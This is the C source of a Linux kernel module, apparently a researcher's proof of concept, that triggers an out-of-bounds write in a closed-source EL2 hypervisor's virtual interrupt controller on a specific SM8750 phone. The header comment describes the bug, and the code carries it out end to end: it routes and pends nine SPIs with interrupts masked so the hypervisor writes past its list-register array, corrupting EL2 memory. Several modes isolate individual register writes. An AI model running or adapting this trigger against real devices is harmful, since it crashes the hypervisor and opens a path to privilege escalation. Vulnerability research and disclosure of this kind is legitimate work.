/*
 * vgic22_hlos.c — real-device (OPD2413 SM8750) trigger for #22
 * (hyp vgic_select_lr ELRSR-unmasked-ctz OOB write) launched from the
 * HLOS (primary) kernel.
 *
 * Real device: HLOS GICD is virtualized by the EL2 (closed-source) vGIC
 * (DT: arm,gic-v3 @ 0x16000000).  Oryon SW LR count = 8, HW LR = 16.
 *
 * Strategy (mirrors QEMU vgic_lr_poc but n=8 and real GICD):
 *  1. ioremap GICD @ 0x16000000, route SPIs spi_first..+n to CPU0
 *     (GICD_IROUTER=0), distinct priorities, enable Group0/1.
 *  2. local_irq_disable() so the guest never acks the SPIs.
 *  3. Enable + pend 8 unused SPIs (default 40..47) -> hyp vgic fills
 *     SW LR 0..7.
 *  4. Pend the 9th SPI (default 48) -> vgic_select_lr finds no free SW
 *     LR, reads ICH_ELRSR_EL2; HW LRs 8..15 always empty => ELRSR bits
 *     8..15 set => ctz() = 8 (unmasked) => vgic_lrs[8] OOB write
 *     (EL2 memory corruption: panic("Out-of-range LR") or
 *      lr_owner_lock corruption -> CPU0 deadlock / freeze).
 *  5. Re-enable IRQs; if the module returns, watch for freeze/RCU stall.
 *
 * Build: GKI DDK (github sunflower2333/gki_build), android15-6.6 tag.
 * Usage: insmod vgic22_hlos.ko [gicd_base=0x16000000] [spi_first=40] [n=8]
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/io.h>
#include <linux/delay.h>
#include <linux/interrupt.h>
#include <linux/sched.h>
#include <linux/cpumask.h>

static unsigned long gicd_base = 0x16000000UL;
module_param(gicd_base, ulong, 0644);
static unsigned int spi_first = 40;
module_param(spi_first, uint, 0644);
static unsigned int n = 8; /* oryon SW LR count */
module_param(n, uint, 0644);
static unsigned int target_cpu = 0;
module_param(target_cpu, uint, 0644);
/* mode: 0=full (IROUTER+prio+CTLR+ICC+pends)  1=read-only baseline
 *       2=IROUTER writes only  3=CTLR+ICC+pends (no IROUTER/prio)
 *       4=pends only (ISENABLER/ISPENDR, no CTLR/ICC)
 *       5=GICD_CTLR only  6=ICC_PMR only  7=ICC_IGRPEN1 only
 *       8=ICC_IGRPEN0 only  10=pend + stay IRQ-masked */
static unsigned int mode = 0;
module_param(mode, uint, 0644);

#define GICD_CTLR	0x0000
#define GICD_IIDR	0x0008
#define GICD_ISENABLER1	0x0104	/* IRQs 32..63 */
#define GICD_ISPENDR1	0x0204	/* IRQs 32..63 */
#define GICD_IPRIORITYR	0x0400
#define GICD_IROUTER	0x6000

static void __iomem *gicd;

static int __init vgic22_init(void)
{
	unsigned long mask = 0;
	u32 iidr;
	int i;
	struct cpumask cm;

	/* pin to the target CPU so ITS IRQs are the ones we mask and the
	 * hyp injects the SPIs into the vCPU whose LRs stay occupied */
	cpumask_clear(&cm);
	cpumask_set_cpu(target_cpu, &cm);
	set_cpus_allowed_ptr(current, &cm);

	gicd = ioremap(gicd_base, 0x10000);
	if (!gicd) {
		pr_err("vgic22: ioremap %#lx failed\n", gicd_base);
		return -ENOMEM;
	}

	iidr = readl(gicd + GICD_IIDR);
	pr_info("vgic22: GICD @ %#lx IIDR=%#x CTLR=%#x mode=%u\n", gicd_base, iidr,
		readl(gicd + GICD_CTLR), mode);
	if (mode == 1) {
		pr_info("vgic22: mode1 read-only, done\n");
		iounmap(gicd);
		return 0;
	}

	/* route spi_first..spi_first+n to CPU0 */
	if (mode == 0 || mode == 2) {
		for (i = 0; i <= n; i++)
			writeq(0, gicd + GICD_IROUTER + (spi_first + i) * 8);
	}

	/* distinct priorities so the vGIC keeps LR order deterministic */
	if (mode == 0) {
		for (i = 0; i <= n; i++)
			writeb(0x10 + i * 0x10,
			       gicd + GICD_IPRIORITYR + spi_first + i);
	}

	if (mode == 0 || mode == 3) {
		writel(0x3, gicd + GICD_CTLR); /* Group0 | Group1 */
		asm volatile("msr ICC_PMR_EL1, %0" : : "r"(0xFFULL));
		asm volatile("msr ICC_IGRPEN1_EL1, %0" : : "r"(1ULL));
		asm volatile("msr ICC_IGRPEN0_EL1, %0" : : "r"(1ULL));
		isb();
	}
	/* single-op isolation modes */
	if (mode == 5) { /* GICD_CTLR=3 only */
		writel(0x3, gicd + GICD_CTLR);
	}
	if (mode == 6) { /* ICC_PMR only */
		asm volatile("msr ICC_PMR_EL1, %0" : : "r"(0xFFULL));
		isb();
	}
	if (mode == 7) { /* ICC_IGRPEN1 only */
		asm volatile("msr ICC_IGRPEN1_EL1, %0" : : "r"(1ULL));
		isb();
	}
	if (mode == 8) { /* ICC_IGRPEN0 only */
		asm volatile("msr ICC_IGRPEN0_EL1, %0" : : "r"(1ULL));
		isb();
	}

	if (mode == 2 || mode == 5 || mode == 6 || mode == 7 || mode == 8) {
		pr_info("vgic22: mode%u single-op done\n", mode);
		iounmap(gicd);
		return 0;
	}

	for (i = 0; i < n; i++)
		mask |= BIT(spi_first - 32 + i);

	pr_info("vgic22: pend %u SPIs %u..%u (mask %#lx), IRQs masked\n",
		n, spi_first, spi_first + n - 1, mask);
	local_irq_disable();
	writel(mask, gicd + GICD_ISENABLER1);
	writel(mask, gicd + GICD_ISPENDR1);
	udelay(100);

	if (mode == 10) {
		/* pend + stay IRQ-masked forever: if the hyp dies at pend
		 * time the device reboots; if it survives, delivery is the
		 * trigger */
		pr_info("vgic22: mode10 pended, staying IRQ-masked\n");
		for (;;)
			cpu_relax();
	}

	/* (n+1)th delivery -> ELRSR ctz=n -> vgic_lrs[n] OOB */
	pr_info("vgic22: pend (n+1)th SPI %u -> trigger\n", spi_first + n);
	writel(BIT(spi_first - 32 + n), gicd + GICD_ISENABLER1);
	writel(BIT(spi_first - 32 + n), gicd + GICD_ISPENDR1);
	udelay(100);
	local_irq_enable();

	pr_info("vgic22: SURVIVED return (no EL2 panic/freeze observed)\n");
	iounmap(gicd);
	return 0;
}

static void __exit vgic22_exit(void)
{
	pr_info("vgic22: exit\n");
}

module_init(vgic22_init);
module_exit(vgic22_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("real-device #22 vgic ELRSR OOB trigger from HLOS");
